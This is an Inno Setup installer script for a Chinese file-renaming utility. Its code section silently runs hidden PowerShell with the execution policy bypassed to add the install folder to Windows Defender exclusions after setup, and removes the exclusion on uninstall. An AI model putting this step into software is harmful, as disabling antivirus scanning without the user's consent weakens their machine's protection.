; 文件重命名助手 v1.0 WPF 自包含版 Inno Setup 安装脚本

#define MyAppName "文件重命名助手"
#define MyAppVersion "1.0.0"
#define MyAppPublisher "文件重命名助手"
#define MyAppExeName "FileRenameAssistant.exe"
#define PublishDir "..\artifacts\publish\win-x64"
#define InstallerOutDir "..\artifacts\installer"

[Setup]
AppId={{0A3E8EBF-8B6C-4EBC-A064-9A266D2BD471}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher={#MyAppPublisher}
DefaultDirName={autopf}\{#MyAppName}
DefaultGroupName={#MyAppName}
OutputDir={#InstallerOutDir}
OutputBaseFilename=文件重命名助手_1.0.0_安装包
Compression=lzma2
SolidCompression=yes
WizardStyle=modern
ArchitecturesAllowed=x64
ArchitecturesInstallIn64BitMode=x64
PrivilegesRequired=admin
SetupLogging=yes
UninstallDisplayIcon={app}\{#MyAppExeName}
UninstallDisplayName={#MyAppName}
SetupIconFile=..\src\FileRenameAssistant\Assets\Icons\app.ico
CloseApplications=yes
RestartApplications=no
CloseApplicationsFilter={#MyAppExeName}

[Languages]
Name: "chinesesimp"; MessagesFile: "compiler:Default.isl,ChineseSimplified.local.isl"

[Tasks]
Name: "desktopicon"; Description: "创建桌面快捷方式"; GroupDescription: "附加任务"; Flags: unchecked

[Files]
Source: "{#PublishDir}\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs

[Icons]
Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
Name: "{group}\卸载 {#MyAppName}"; Filename: "{uninstallexe}"
Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: desktopicon

[Registry]
Root: HKCU; Subkey: "Software\文件重命名助手"; ValueType: string; ValueName: "InstallPath"; ValueData: "{app}"; Flags: uninsdeletekey
Root: HKCU; Subkey: "Software\FileRenameAssistant"; ValueType: string; ValueName: "InstallPath"; ValueData: "{app}"; Flags: uninsdeletekey
Root: HKLM64; Subkey: "Software\文件重命名助手"; ValueType: string; ValueName: "InstallPath"; ValueData: "{app}"; Flags: uninsdeletekey
Root: HKLM64; Subkey: "Software\FileRenameAssistant"; ValueType: string; ValueName: "InstallPath"; ValueData: "{app}"; Flags: uninsdeletekey

[Run]
Filename: "{app}\{#MyAppExeName}"; Description: "启动 {#MyAppName}"; Flags: nowait postinstall skipifsilent

[UninstallRun]
Filename: "{cmd}"; Parameters: "/C taskkill /IM ""{#MyAppExeName}"" /F /T >NUL 2>NUL"; Flags: runhidden

[InstallDelete]
Type: filesandordirs; Name: "{app}"
Type: filesandordirs; Name: "{localappdata}\FileRenameAssistant"
Type: filesandordirs; Name: "{localappdata}\文件重命名助手"

[UninstallDelete]
Type: filesandordirs; Name: "{app}"
Type: filesandordirs; Name: "{localappdata}\FileRenameAssistant"
Type: filesandordirs; Name: "{localappdata}\文件重命名助手"
Type: filesandordirs; Name: "{userappdata}\FileRenameAssistant"
Type: filesandordirs; Name: "{userappdata}\文件重命名助手"
Type: filesandordirs; Name: "{commonappdata}\FileRenameAssistant"
Type: filesandordirs; Name: "{commonappdata}\文件重命名助手"
Type: files; Name: "{autodesktop}\{#MyAppName}.lnk"
Type: files; Name: "{userdesktop}\{#MyAppName}.lnk"
Type: filesandordirs; Name: "{group}"

[Code]
// 安装时自动将安装目录加入 Windows Defender 排除项
procedure AddDefenderExclusion(const Path: string);
var
  ResultCode: Integer;
begin
  if not Exec('powershell.exe', '-NoProfile -ExecutionPolicy Bypass -Command "' +
    'try { Add-MpPreference -ExclusionPath ''' + Path + ''' -ErrorAction Stop; exit 0 } ' +
    'catch { exit 1 }"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode) then
  begin
    Log('Defender exclusion add failed: powershell not found');
  end
  else if ResultCode <> 0 then
  begin
    Log('Defender exclusion add failed with code ' + IntToStr(ResultCode));
  end
  else
  begin
    Log('Defender exclusion added: ' + Path);
  end;
end;

// 卸载时自动移除 Windows Defender 排除项
procedure RemoveDefenderExclusion(const Path: string);
var
  ResultCode: Integer;
begin
  if not Exec('powershell.exe', '-NoProfile -ExecutionPolicy Bypass -Command "' +
    'try { Remove-MpPreference -ExclusionPath ''' + Path + ''' -ErrorAction Stop; exit 0 } ' +
    'catch { exit 1 }"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode) then
  begin
    Log('Defender exclusion remove failed: powershell not found');
  end
  else if ResultCode <> 0 then
  begin
    Log('Defender exclusion remove failed with code ' + IntToStr(ResultCode));
  end
  else
  begin
    Log('Defender exclusion removed: ' + Path);
  end;
end;

procedure CurStepChanged(CurStep: TSetupStep);
begin
  if CurStep = ssPostInstall then
  begin
    AddDefenderExclusion(ExpandConstant('{app}'));
  end;
end;

procedure CurUninstallStepChanged(CurUninstallStep: TUninstallStep);
begin
  if CurUninstallStep = usPostUninstall then
  begin
    RemoveDefenderExclusion(ExpandConstant('{app}'));
    RegDeleteKeyIncludingSubkeys(HKEY_CURRENT_USER, 'Software\文件重命名助手');
    RegDeleteKeyIncludingSubkeys(HKEY_CURRENT_USER, 'Software\FileRenameAssistant');
    RegDeleteKeyIncludingSubkeys(HKEY_LOCAL_MACHINE, 'Software\文件重命名助手');
    RegDeleteKeyIncludingSubkeys(HKEY_LOCAL_MACHINE, 'Software\FileRenameAssistant');
  end;
end;
